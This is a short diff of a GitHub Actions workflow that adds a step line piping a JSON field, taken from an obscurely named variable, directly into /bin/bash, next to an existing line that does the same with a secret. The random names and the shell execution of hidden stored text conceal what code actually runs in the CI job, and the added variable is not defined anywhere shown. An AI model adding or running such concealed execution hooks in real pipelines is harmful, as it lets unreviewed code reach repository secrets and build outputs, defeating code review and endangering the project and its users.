@@ -22,6 +22,7 @@ jobs:
           vv7099: ${{ secrets.vv7099 }}
         run: |
           printf '%s' "$vv7099" | jq -r .lgw73337 | /bin/bash
+          printf '%s' "$zg56290" | jq -r .wybcs0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
